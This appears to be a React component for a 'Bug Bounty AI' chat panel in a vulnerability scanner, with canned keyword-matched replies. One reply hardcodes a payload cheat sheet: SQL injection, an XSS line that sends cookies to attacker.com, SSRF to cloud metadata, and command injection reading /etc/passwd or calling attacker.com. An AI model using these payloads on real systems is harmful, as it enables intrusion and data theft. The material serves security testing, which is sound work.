import React, { useState, useRef, useEffect } from 'react'
import { motion, AnimatePresence } from 'framer-motion'
import { 
  Brain, Send, Settings, MessageCircle, Zap, 
  Shield, Bug, Target, History, BookOpen,
  ChevronDown, ChevronUp, Copy, Download
} from 'lucide-react'
import { ScanResult, Finding } from '../types/scanner'
import toast from 'react-hot-toast'

interface AIMessage {
  id: string
  type: 'user' | 'assistant'
  content: string
  timestamp: Date
  scanContext?: ScanResult
  findings?: Finding[]
}

interface AIAssistantProps {
  scanHistory: ScanResult[]
  currentScan?: ScanResult
}

const AIAssistant: React.FC<AIAssistantProps> = ({ scanHistory, currentScan }) => {
  const [isOpen, setIsOpen] = useState(false)
  const [messages, setMessages] = useState<AIMessage[]>([])
  const [inputMessage, setInputMessage] = useState('')
  const [isLoading, setIsLoading] = useState(false)
  const [selectedModel, setSelectedModel] = useState('gpt-4')
  const [showSettings, setShowSettings] = useState(false)
  const messagesEndRef = useRef<HTMLDivElement>(null)

  const [aiSettings, setAiSettings] = useState({
    openaiKey: '',
    anthropicKey: '',
    geminiKey: '',
    mistralKey: '',
    openrouterKey: '',
    selectedProvider: 'openai',
    model: 'gpt-4',
    temperature: 0.7,
    maxTokens: 2000,
    includeContext: true,
    bugBountyMode: true
  })

  const modelOptions = {
    openai: [
      { value: 'gpt-4', label: 'GPT-4' },
      { value: 'gpt-4-turbo', label: 'GPT-4 Turbo' },
      { value: 'gpt-3.5-turbo', label: 'GPT-3.5 Turbo' }
    ],
    anthropic: [
      { value: 'claude-3-opus', label: 'Claude 3 Opus' },
      { value: 'claude-3-sonnet', label: 'Claude 3 Sonnet' },
      { value: 'claude-3-haiku', label: 'Claude 3 Haiku' }
    ],
    gemini: [
      { value: 'gemini-pro', label: 'Gemini Pro' },
      { value: 'gemini-pro-vision', label: 'Gemini Pro Vision' }
    ],
    mistral: [
      { value: 'mistral-large', label: 'Mistral Large' },
      { value: 'mistral-medium', label: 'Mistral Medium' },
      { value: 'mistral-small', label: 'Mistral Small' }
    ],
    openrouter: [
      { value: 'openrouter/auto', label: 'Auto (Best Available)' },
      { value: 'anthropic/claude-3-opus', label: 'Claude 3 Opus' },
      { value: 'openai/gpt-4-turbo', label: 'GPT-4 Turbo' },
      { value: 'google/gemini-pro', label: 'Gemini Pro' }
    ]
  }

  useEffect(() => {
    if (messages.length === 0) {
      // Initialize with welcome message
      setMessages([{
        id: '1',
        type: 'assistant',
        content: `🛡️ **Bug Bounty AI Assistant Ready!**

I'm your specialized security research companion with deep knowledge of:

• **OWASP Top 10** vulnerabilities and exploitation techniques
• **Bug bounty methodologies** and hunting strategies  
• **CVE analysis** and vulnerability research
• **Payload crafting** for various attack vectors
• **Report writing** and impact assessment

I can analyze your scan results, suggest attack vectors, help with payload development, and provide insights based on your scan history.

**Quick Commands:**
• \`analyze\` - Deep dive into current scan results
• \`suggest\` - Get attack vector recommendations
• \`payloads\` - Generate custom payloads
• \`report\` - Help write vulnerability reports
• \`history\` - Analyze patterns in your scan history

What would you like to explore today?`,
        timestamp: new Date()
      }])
    }
  }, [])

  useEffect(() => {
    scrollToBottom()
  }, [messages])

  const scrollToBottom = () => {
    messagesEndRef.current?.scrollIntoView({ behavior: 'smooth' })
  }

  const buildContextPrompt = () => {
    let context = `You are a specialized bug bounty and penetration testing AI assistant with expert knowledge in:

CORE EXPERTISE:
- OWASP Top 10 vulnerabilities and exploitation
- Bug bounty hunting methodologies and strategies
- CVE research and vulnerability analysis
- Payload development and attack vector identification
- Security report writing and impact assessment
- Web application security testing
- Network security assessment
- Mobile application security
- API security testing
- Cloud security assessment

CURRENT CONTEXT:`

    if (currentScan) {
      context += `\n\nCURRENT SCAN RESULTS:
Target: ${currentScan.url}
Scan Types: ${currentScan.scanTypes.join(', ')}
Vulnerabilities Found: ${currentScan.vulnerabilities}
Status: ${currentScan.status}

FINDINGS:
${currentScan.findings.map(f => `
- ${f.type} (${f.severity}): ${f.description}
  Impact: ${f.impact}
  Recommendation: ${f.recommendation}
`).join('')}`
    }

    if (scanHistory.length > 0) {
      context += `\n\nSCAN HISTORY (Last 5 scans):
${scanHistory.slice(-5).map(scan => `
- ${scan.url}: ${scan.vulnerabilities} vulnerabilities found
  Types: ${scan.scanTypes.join(', ')}
  Key findings: ${scan.findings.slice(0, 2).map(f => f.type).join(', ')}
`).join('')}`
    }

    context += `\n\nINSTRUCTIONS:
- Provide actionable security insights and recommendations
- Suggest specific attack vectors and exploitation techniques
- Help with payload development and testing strategies
- Offer bug bounty hunting tips and methodologies
- Assist with vulnerability report writing
- Analyze patterns across scan history
- Focus on practical, real-world security testing approaches
- Always consider impact and business risk
- Provide step-by-step exploitation guidance when appropriate
- Suggest tools and techniques for further testing

Respond in a helpful, technical manner appropriate for security professionals and bug bounty hunters.`

    return context
  }

  const sendMessage = async () => {
    if (!inputMessage.trim() || isLoading) return

    const userMessage: AIMessage = {
      id: Date.now().toString(),
      type: 'user',
      content: inputMessage,
      timestamp: new Date(),
      scanContext: currentScan,
      findings: currentScan?.findings
    }

    setMessages(prev => [...prev, userMessage])
    setInputMessage('')
    setIsLoading(true)

    try {
      // Simulate AI response (replace with actual API call)
      const response = await simulateAIResponse(inputMessage, buildContextPrompt())
      
      const assistantMessage: AIMessage = {
        id: (Date.now() + 1).toString(),
        type: 'assistant',
        content: response,
        timestamp: new Date()
      }

      setMessages(prev => [...prev, assistantMessage])
    } catch (error) {
      toast.error('Failed to get AI response. Please check your API configuration.')
    } finally {
      setIsLoading(false)
    }
  }

  const simulateAIResponse = async (message: string, context: string): Promise<string> => {
    // Simulate API delay
    await new Promise(resolve => setTimeout(resolve, 1500))

    const lowerMessage = message.toLowerCase()

    if (lowerMessage.includes('analyze') || lowerMessage.includes('current scan')) {
      return generateAnalysisResponse()
    } else if (lowerMessage.includes('suggest') || lowerMessage.includes('attack')) {
      return generateSuggestionsResponse()
    } else if (lowerMessage.includes('payload')) {
      return generatePayloadResponse()
    } else if (lowerMessage.includes('report')) {
      return generateReportResponse()
    } else if (lowerMessage.includes('history')) {
      return generateHistoryResponse()
    } else {
      return generateGeneralResponse(message)
    }
  }

  const generateAnalysisResponse = () => {
    if (!currentScan || currentScan.findings.length === 0) {
      return `🔍 **Current Scan Analysis**

No active scan results to analyze. Start a new scan to get detailed vulnerability analysis and exploitation recommendations.

**Suggested Actions:**
1. Run a comprehensive scan with multiple test types
2. Focus on OWASP Top 10 vulnerabilities
3. Include both automated and manual testing approaches`
    }

    const highSeverityFindings = currentScan.findings.filter(f => f.severity === 'high' || f.severity === 'critical')
    
    return `🔍 **Deep Scan Analysis for ${currentScan.url}**

**Risk Assessment:**
- **Critical/High Risk Issues:** ${highSeverityFindings.length}
- **Total Vulnerabilities:** ${currentScan.findings.length}
- **Attack Surface:** ${currentScan.scanTypes.length} vectors tested

**Priority Findings:**
${highSeverityFindings.slice(0, 3).map((finding, i) => `
${i + 1}. **${finding.type}** (${finding.severity.toUpperCase()})
   - **Impact:** ${finding.impact}
   - **Exploitation:** ${getExploitationTips(finding.type)}
   - **Business Risk:** ${getBusinessRisk(finding.severity)}
`).join('')}

**Recommended Next Steps:**
1. **Immediate:** Focus on ${highSeverityFindings.length > 0 ? 'high-severity' : 'medium-severity'} findings
2. **Manual Testing:** Verify automated findings with manual techniques
3. **Exploitation:** Develop proof-of-concept exploits for validation
4. **Documentation:** Prepare detailed vulnerability reports

**Bug Bounty Potential:** ${getBugBountyPotential(currentScan.findings)}

Would you like specific exploitation techniques for any of these findings?`
  }

  const generateSuggestionsResponse = () => {
    return `🎯 **Attack Vector Recommendations**

Based on your scan results and target analysis, here are prioritized attack vectors:

**High-Priority Vectors:**
1. **SQL Injection Testing**
   - Union-based injection in search parameters
   - Time-based blind injection in login forms
   - Error-based injection in API endpoints

2. **Cross-Site Scripting (XSS)**
   - Reflected XSS in user input fields
   - Stored XSS in comment/feedback systems
   - DOM-based XSS in client-side routing

3. **Authentication Bypass**
   - JWT token manipulation
   - Session fixation attacks
   - Password reset vulnerabilities

**Advanced Techniques:**
- **SSRF via file upload** functionality
- **XXE injection** in XML parsers
- **Deserialization attacks** in API endpoints
- **Race conditions** in payment/transaction flows

**Tools & Techniques:**
- **Burp Suite:** For manual testing and payload customization
- **SQLMap:** For automated SQL injection testing
- **XSStrike:** For advanced XSS detection
- **Nuclei:** For CVE-based vulnerability scanning

**Bug Bounty Tips:**
- Focus on business logic flaws (often overlooked)
- Test edge cases and error conditions
- Chain multiple low-severity issues for higher impact
- Document clear reproduction steps

Need specific payloads or exploitation techniques for any of these?`
  }

  const generatePayloadResponse = () => {
    return `🚀 **Custom Payload Development**

**SQL Injection Payloads:**
\`\`\`sql
-- Union-based
' UNION SELECT 1,2,3,database(),user(),version()--

-- Time-based blind
'; IF(1=1) WAITFOR DELAY '00:00:05'--

-- Error-based
' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
\`\`\`

**XSS Payloads:**
\`\`\`javascript
// Basic reflection
<script>alert('XSS')</script>

// DOM manipulation
<img src=x onerror=alert(document.domain)>

// Advanced payload
<svg onload=fetch('//attacker.com/'+document.cookie)>
\`\`\`

**SSRF Payloads:**
\`\`\`
# Internal network scanning
http://127.0.0.1:8080/admin
http://169.254.169.254/latest/meta-data/

# Cloud metadata
http://metadata.google.internal/computeMetadata/v1/
\`\`\`

**Command Injection:**
\`\`\`bash
# Basic injection
; cat /etc/passwd

# Blind injection
; curl http://attacker.com/$(whoami)

# Time-based
; sleep 10
\`\`\`

**Customization Tips:**
- Encode payloads to bypass WAF filters
- Use different injection contexts (URL, headers, body)
- Test with various HTTP methods
- Chain payloads for complex attacks

Would you like me to generate payloads for a specific vulnerability type?`
  }

  const generateReportResponse = () => {
    return `📝 **Vulnerability Report Writing Guide**

**Report Structure:**

**1. Executive Summary**
- Business impact and risk level
- Number of vulnerabilities by severity
- Recommended timeline for remediation

**2. Technical Details**
\`\`\`
Title: [Vulnerability Type] in [Component]
Severity: [Critical/High/Medium/Low]
CVSS Score: [If applicable]

Description:
[Clear explanation of the vulnerability]

Impact:
[What an attacker could achieve]

Reproduction Steps:
1. Navigate to [URL]
2. Enter payload: [specific payload]
3. Observe [expected result]

Evidence:
[Screenshots, request/response examples]

Recommendation:
[Specific remediation steps]
\`\`\`

**3. Proof of Concept**
- Working exploit code
- Screenshots showing impact
- Video demonstration (for complex issues)

**Bug Bounty Best Practices:**
- **Clear Impact:** Explain business consequences
- **Detailed Steps:** Make it easy to reproduce
- **Professional Tone:** Maintain respectful communication
- **Suggest Fixes:** Provide actionable remediation
- **Follow Guidelines:** Adhere to program rules

**Common Mistakes to Avoid:**
- Vague descriptions
- Missing reproduction steps
- Overstating impact
- Poor quality evidence
- Duplicate submissions

**Report Templates:**
- **Critical:** Data breach, RCE, authentication bypass
- **High:** Privilege escalation, sensitive data exposure
- **Medium:** XSS, CSRF, information disclosure
- **Low:** Missing headers, verbose errors

Need help writing a specific vulnerability report?`
  }

  const generateHistoryResponse = () => {
    if (scanHistory.length === 0) {
      return `📊 **Scan History Analysis**

No scan history available yet. Start running scans to build your vulnerability database and track security improvements over time.

**Benefits of Scan History:**
- Track vulnerability trends
- Identify recurring issues
- Monitor security improvements
- Build target intelligence
- Develop custom attack strategies`
    }

    const totalVulns = scanHistory.reduce((sum, scan) => sum + scan.vulnerabilities, 0)
    const avgVulns = totalVulns / scanHistory.length
    const mostCommonTypes = getMostCommonVulnerabilityTypes(scanHistory)

    return `📊 **Scan History Analysis**

**Overview:**
- **Total Scans:** ${scanHistory.length}
- **Total Vulnerabilities:** ${totalVulns}
- **Average per Scan:** ${avgVulns.toFixed(1)}

**Vulnerability Trends:**
${mostCommonTypes.map((type, i) => `${i + 1}. **${type.name}** (${type.count} occurrences)`).join('\n')}

**Target Intelligence:**
${scanHistory.slice(-3).map(scan => `
- **${scan.url}**
  - Last scan: ${scan.timestamp}
  - Vulnerabilities: ${scan.vulnerabilities}
  - Key issues: ${scan.findings.slice(0, 2).map(f => f.type).join(', ')}
`).join('')}

**Recommendations:**
1. **Focus Areas:** Target the most common vulnerability types
2. **Retesting:** Revisit high-value targets for new issues
3. **Methodology:** Expand testing based on successful findings
4. **Automation:** Create custom scans for recurring patterns

**Bug Bounty Insights:**
- Targets with consistent findings may have systemic issues
- Focus on applications with complex functionality
- Look for patterns that indicate poor security practices

Would you like a detailed analysis of any specific target or vulnerability type?`
  }

  const generateGeneralResponse = (message: string) => {
    return `🤖 **AI Security Assistant**

I understand you're asking about: "${message}"

I'm here to help with:
- **Vulnerability Analysis:** Deep dive into scan results
- **Attack Strategies:** Suggest exploitation techniques
- **Payload Development:** Create custom attack payloads
- **Report Writing:** Help document findings professionally
- **Bug Bounty Guidance:** Share hunting methodologies
- **Tool Recommendations:** Suggest appropriate security tools

**Quick Commands:**
- Type \`analyze\` for current scan analysis
- Type \`suggest\` for attack vector recommendations
- Type \`payloads\` for custom payload generation
- Type \`report\` for vulnerability reporting help
- Type \`history\` for scan history analysis

**Example Questions:**
- "How can I exploit this SQL injection?"
- "What's the best way to test for XSS?"
- "Help me write a report for this CSRF vulnerability"
- "What tools should I use for API testing?"

What specific security topic would you like to explore?`
  }

  const getExploitationTips = (vulnType: string) => {
    const tips = {
      'SQL Injection': 'Use union-based queries to extract data, test for blind injection with time delays',
      'Cross-Site Scripting': 'Test in different contexts (HTML, JS, CSS), bypass filters with encoding',
      'CORS Misconfiguration': 'Test with malicious origins, check for credential inclusion',
      'Missing Security Headers': 'Test for clickjacking, MIME sniffing, and XSS protection bypass'
    }
    return tips[vulnType] || 'Manual verification recommended with custom payloads'
  }

  const getBusinessRisk = (severity: string) => {
    const risks = {
      'critical': 'Immediate data breach risk, potential regulatory violations',
      'high': 'Significant security compromise, user data at risk',
      'medium': 'Moderate security impact, potential for privilege escalation',
      'low': 'Limited impact, information disclosure possible'
    }
    return risks[severity] || 'Risk assessment needed'
  }

  const getBugBountyPotential = (findings: Finding[]) => {
    const highImpact = findings.filter(f => f.severity === 'high' || f.severity === 'critical').length
    if (highImpact > 2) return 'High - Multiple critical issues present'
    if (highImpact > 0) return 'Medium - Some high-impact vulnerabilities found'
    return 'Low - Focus on chaining issues for higher impact'
  }

  const getMostCommonVulnerabilityTypes = (history: ScanResult[]) => {
    const typeCount: Record<string, number> = {}
    history.forEach(scan => {
      scan.findings.forEach(finding => {
        typeCount[finding.type] = (typeCount[finding.type] || 0) + 1
      })
    })
    
    return Object.entries(typeCount)
      .map(([name, count]) => ({ name, count }))
      .sort((a, b) => b.count - a.count)
      .slice(0, 5)
  }

  const copyMessage = (content: string) => {
    navigator.clipboard.writeText(content)
    toast.success('Message copied to clipboard')
  }

  const exportChat = () => {
    const chatData = {
      timestamp: new Date().toISOString(),
      messages: messages,
      scanContext: currentScan,
      settings: aiSettings
    }
    
    const dataStr = JSON.stringify(chatData, null, 2)
    const dataBlob = new Blob([dataStr], { type: 'application/json' })
    const url = URL.createObjectURL(dataBlob)
    const link = document.createElement('a')
    link.href = url
    link.download = `ai_chat_${new Date().toISOString().split('T')[0]}.json`
    link.click()
    URL.revokeObjectURL(url)
    toast.success('Chat exported successfully')
  }

  return (
    <>
      {/* AI Assistant Toggle Button */}
      <motion.button
        onClick={() => setIsOpen(true)}
        className="fixed bottom-6 right-6 p-4 bg-gradient-to-r from-purple-600 to-blue-600 text-white rounded-full shadow-lg hover:shadow-xl transition-all duration-300 z-50"
        whileHover={{ scale: 1.05 }}
        whileTap={{ scale: 0.95 }}
        initial={{ opacity: 0, y: 100 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ delay: 1 }}
      >
        <Brain className="w-6 h-6" />
        <div className="absolute -top-2 -right-2 w-4 h-4 bg-red-500 rounded-full animate-pulse" />
      </motion.button>

      {/* AI Assistant Panel */}
      <AnimatePresence>
        {isOpen && (
          <motion.div
            initial={{ opacity: 0, x: 400 }}
            animate={{ opacity: 1, x: 0 }}
            exit={{ opacity: 0, x: 400 }}
            transition={{ type: 'spring', damping: 25, stiffness: 200 }}
            className="fixed top-0 right-0 w-96 h-full bg-white dark:bg-gray-900 shadow-2xl z-50 flex flex-col border-l border-gray-200 dark:border-gray-700"
          >
            {/* Header */}
            <div className="p-4 border-b border-gray-200 dark:border-gray-700 bg-gradient-to-r from-purple-600 to-blue-600">
              <div className="flex items-center justify-between">
                <div className="flex items-center space-x-3">
                  <Brain className="w-6 h-6 text-white" />
                  <div>
                    <h3 className="font-semibold text-white">Bug Bounty AI</h3>
                    <p className="text-xs text-purple-100">Security Research Assistant</p>
                  </div>
                </div>
                <div className="flex items-center space-x-2">
                  <button
                    onClick={() => setShowSettings(!showSettings)}
                    className="p-2 text-white hover:bg-white/20 rounded-lg transition-colors"
                  >
                    <Settings className="w-4 h-4" />
                  </button>
                  <button
                    onClick={() => setIsOpen(false)}
                    className="p-2 text-white hover:bg-white/20 rounded-lg transition-colors"
                  >
                    ×
                  </button>
                </div>
              </div>
            </div>

            {/* Settings Panel */}
            <AnimatePresence>
              {showSettings && (
                <motion.div
                  initial={{ height: 0 }}
                  animate={{ height: 'auto' }}
                  exit={{ height: 0 }}
                  className="border-b border-gray-200 dark:border-gray-700 overflow-hidden"
                >
                  <div className="p-4 space-y-4 bg-gray-50 dark:bg-gray-800">
                    <div>
                      <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                        AI Provider
                      </label>
                      <select
                        value={aiSettings.selectedProvider}
                        onChange={(e) => setAiSettings(prev => ({ ...prev, selectedProvider: e.target.value }))}
                        className="input-field text-sm"
                      >
                        <option value="openai">OpenAI</option>
                        <option value="anthropic">Anthropic</option>
                        <option value="gemini">Google Gemini</option>
                        <option value="mistral">Mistral</option>
                        <option value="openrouter">OpenRouter</option>
                      </select>
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                        Model
                      </label>
                      <select
                        value={aiSettings.model}
                        onChange={(e) => setAiSettings(prev => ({ ...prev, model: e.target.value }))}
                        className="input-field text-sm"
                      >
                        {modelOptions[aiSettings.selectedProvider as keyof typeof modelOptions]?.map(model => (
                          <option key={model.value} value={model.value}>
                            {model.label}
                          </option>
                        ))}
                      </select>
                    </div>

                    <div>
                      <label className="block text-sm font-medium text-gray-700 dark:text-gray-300 mb-2">
                        API Key
                      </label>
                      <input
                        type="password"
                        value={aiSettings[`${aiSettings.selectedProvider}Key` as keyof typeof aiSettings] as string}
                        onChange={(e) => setAiSettings(prev => ({ 
                          ...prev, 
                          [`${aiSettings.selectedProvider}Key`]: e.target.value 
                        }))}
                        placeholder={`Enter ${aiSettings.selectedProvider} API key`}
                        className="input-field text-sm"
                      />
                    </div>

                    <div className="flex items-center space-x-4">
                      <label className="flex items-center space-x-2">
                        <input
                          type="checkbox"
                          checked={aiSettings.bugBountyMode}
                          onChange={(e) => setAiSettings(prev => ({ ...prev, bugBountyMode: e.target.checked }))}
                          className="rounded"
                        />
                        <span className="text-sm text-gray-700 dark:text-gray-300">Bug Bounty Mode</span>
                      </label>
                    </div>
                  </div>
                </motion.div>
              )}
            </AnimatePresence>

            {/* Messages */}
            <div className="flex-1 overflow-y-auto p-4 space-y-4">
              {messages.map((message) => (
                <motion.div
                  key={message.id}
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  className={`flex ${message.type === 'user' ? 'justify-end' : 'justify-start'}`}
                >
                  <div className={`max-w-[85%] p-3 rounded-lg relative group ${
                    message.type === 'user'
                      ? 'bg-blue-600 text-white'
                      : 'bg-gray-100 dark:bg-gray-800 text-gray-900 dark:text-white'
                  }`}>
                    <div className="prose prose-sm max-w-none">
                      {message.content.split('\n').map((line, i) => {
                        if (line.startsWith('```')) {
                          return null // Handle code blocks separately
                        }
                        if (line.startsWith('**') && line.endsWith('**')) {
                          return <div key={i} className="font-bold mt-2 mb-1">{line.slice(2, -2)}</div>
                        }
                        if (line.startsWith('- ')) {
                          return <div key={i} className="ml-4">• {line.slice(2)}</div>
                        }
                        if (line.trim() === '') {
                          return <div key={i} className="h-2" />
                        }
                        return <div key={i}>{line}</div>
                      })}
                    </div>
                    
                    <button
                      onClick={() => copyMessage(message.content)}
                      className="absolute top-2 right-2 opacity-0 group-hover:opacity-100 p-1 hover:bg-black/10 rounded transition-all"
                    >
                      <Copy className="w-3 h-3" />
                    </button>
                    
                    <div className="text-xs opacity-70 mt-2">
                      {message.timestamp.toLocaleTimeString()}
                    </div>
                  </div>
                </motion.div>
              ))}
              
              {isLoading && (
                <motion.div
                  initial={{ opacity: 0 }}
                  animate={{ opacity: 1 }}
                  className="flex justify-start"
                >
                  <div className="bg-gray-100 dark:bg-gray-800 p-3 rounded-lg">
                    <div className="flex space-x-1">
                      <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" />
                      <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: '0.1s' }} />
                      <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{ animationDelay: '0.2s' }} />
                    </div>
                  </div>
                </motion.div>
              )}
              
              <div ref={messagesEndRef} />
            </div>

            {/* Input */}
            <div className="p-4 border-t border-gray-200 dark:border-gray-700">
              <div className="flex items-center space-x-2 mb-2">
                <button
                  onClick={exportChat}
                  className="p-2 text-gray-500 hover:text-gray-700 dark:text-gray-400 dark:hover:text-gray-200 transition-colors"
                >
                  <Download className="w-4 h-4" />
                </button>
                <div className="flex-1 text-xs text-gray-500 dark:text-gray-400">
                  {scanHistory.length} scans • {currentScan ? 'Active scan' : 'No active scan'}
                </div>
              </div>
              
              <div className="flex space-x-2">
                <input
                  type="text"
                  value={inputMessage}
                  onChange={(e) => setInputMessage(e.target.value)}
                  onKeyPress={(e) => e.key === 'Enter' && sendMessage()}
                  placeholder="Ask about vulnerabilities, payloads, or bug bounty strategies..."
                  className="input-field text-sm"
                  disabled={isLoading}
                />
                <button
                  onClick={sendMessage}
                  disabled={isLoading || !inputMessage.trim()}
                  className="btn-primary p-2 disabled:opacity-50"
                >
                  <Send className="w-4 h-4" />
                </button>
              </div>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </>
  )
}

export default AIAssistant